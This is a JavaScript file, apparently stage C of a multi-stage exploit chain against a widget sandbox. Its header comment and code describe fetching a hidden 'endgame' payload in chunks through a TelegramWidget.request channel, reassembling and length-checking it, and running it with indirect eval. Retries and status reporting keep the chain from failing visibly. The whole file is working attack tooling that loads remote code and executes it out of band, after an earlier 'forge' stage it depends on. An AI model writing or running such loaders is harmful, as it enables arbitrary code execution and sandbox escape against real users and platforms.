/* Out-of-band endgame driver (stage C) for the 72801 parser route 2.
 * The endgame source is NOT in the page: after the stage-A forge it is
 * fetched with TelegramWidget.request("E<i>") (one 950-B chunk per answer),
 * 5.2 s background pacing, joined, length-checked and eval'd in the same
 * runtime (V/VAB are stage-A globals). A miss is retried 3x and reported;
 * the driver never throws. */
(function(){
 var L=(typeof OOB_LEN=="number")?OOB_LEN:7469,
     Y=(typeof OOB_DLY=="number")?OOB_DLY:5200,
     N=Math.ceil(L/950),P=[],T=0,F="W";
 function S(){var d=document.getElementById("v");if(d)d.textContent="S1 "+(typeof mark!="undefined"?mark:"-")+" | "+F}
 function Q(f,m){if(typeof setTimeout=="function")setTimeout(f,m);else f()}
 function G(i){
  if(i>=N){var s=P.join("");if(s.length!==L){F="LEN "+s.length;return S()}
   try{(0,eval)(s)}catch(e){F="EV "+e;return S()}
   F="HF "+(typeof MEGA!="undefined"?MEGA:"?");return S()}
  if(typeof TelegramWidget=="undefined"||!TelegramWidget.request){F="NOAPI";return S()}
  var p;try{p=TelegramWidget.request("E"+i)}catch(e){p=null}
  if(!p||typeof p.then!="function"){F="PROMISE";return S()}
  p.then(function(a){
   /* the sandbox resolves request() with Object.freeze({result: <string|null>})
      (release 72801 sandbox-bundle.js: j1()), not with the raw string. */
   var s=(typeof a=="string")?a:(a&&typeof a.result=="string")?a.result:"";
   if(s.length<1){if(++T>2){F="F"+i;return S()}return Q(function(){G(i)},Y)}
   P[i]=s;T=0;F="G"+(i+1)+"/"+N;S();Q(function(){G(i+1)},(i+1<N)?Y:0)
  },function(){if(++T>2){F="X"+i;return S()}Q(function(){G(i)},Y)})
 }
 G(0)
})();
